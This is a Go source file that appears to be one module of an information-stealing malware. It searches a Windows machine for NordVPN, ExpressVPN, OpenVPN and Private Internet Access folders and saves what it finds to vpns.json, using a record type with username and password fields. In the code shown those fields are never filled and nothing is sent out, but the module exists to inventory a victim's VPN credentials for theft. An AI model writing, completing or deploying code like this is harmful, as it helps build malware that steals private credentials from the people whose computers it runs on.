// ============================================================
// vpn.go - VPN Client Extraction
// ============================================================
package vpn

import (
	"encoding/json"
	"log"
	"os"
	"path/filepath"
	"runtime"
)

type VPNConfig struct {
	Name     string `json:"name"`
	Path     string `json:"path"`
	Provider string `json:"provider"`
	Username string `json:"username"`
	Password string `json:"password"`
}

// Run extracts VPN client configurations
func Run() {
	log.Println("🔒 Extracting VPN client configurations...")
	
	var vpns []VPNConfig
	
	// NordVPN
	if nord := findNordVPN(); nord != nil {
		vpns = append(vpns, *nord)
	}
	
	// ExpressVPN
	if express := findExpressVPN(); express != nil {
		vpns = append(vpns, *express)
	}
	
	// OpenVPN
	if openvpn := findOpenVPN(); openvpn != nil {
		vpns = append(vpns, *openvpn)
	}
	
	// Private Internet Access
	if pia := findPIA(); pia != nil {
		vpns = append(vpns, *pia)
	}
	
	saveVPNs(vpns)
}

// findNordVPN finds NordVPN configurations
func findNordVPN() *VPNConfig {
	if runtime.GOOS == "windows" {
		nordPath := filepath.Join(os.Getenv("APPDATA"), "NordVPN")
		if _, err := os.Stat(nordPath); err == nil {
			return &VPNConfig{
				Name:     "NordVPN",
				Path:     nordPath,
				Provider: "NordVPN",
			}
		}
	}
	return nil
}

// findExpressVPN finds ExpressVPN configurations
func findExpressVPN() *VPNConfig {
	if runtime.GOOS == "windows" {
		expressPath := filepath.Join(os.Getenv("APPDATA"), "ExpressVPN")
		if _, err := os.Stat(expressPath); err == nil {
			return &VPNConfig{
				Name:     "ExpressVPN",
				Path:     expressPath,
				Provider: "ExpressVPN",
			}
		}
	}
	return nil
}

// findOpenVPN finds OpenVPN configurations
func findOpenVPN() *VPNConfig {
	if runtime.GOOS == "windows" {
		openvpnPath := filepath.Join(os.Getenv("PROGRAMFILES"), "OpenVPN")
		if _, err := os.Stat(openvpnPath); err == nil {
			return &VPNConfig{
				Name:     "OpenVPN",
				Path:     openvpnPath,
				Provider: "OpenVPN",
			}
		}
	}
	return nil
}

// findPIA finds Private Internet Access configurations
func findPIA() *VPNConfig {
	if runtime.GOOS == "windows" {
		piaPath := filepath.Join(os.Getenv("APPDATA"), "PIA")
		if _, err := os.Stat(piaPath); err == nil {
			return &VPNConfig{
				Name:     "Private Internet Access",
				Path:     piaPath,
				Provider: "PIA",
			}
		}
	}
	return nil
}

// saveVPNs saves VPN configurations to file
func saveVPNs(vpns []VPNConfig) {
	data, err := json.MarshalIndent(vpns, "", "  ")
	if err != nil {
		log.Printf("❌ Failed to marshal VPNs: %v", err)
		return
	}
	
	if err := os.WriteFile("vpns.json", data, 0644); err != nil {
		log.Printf("❌ Failed to save VPNs: %v", err)
		return
	}
	
	log.Printf("🔒 Found %d VPN clients", len(vpns))
}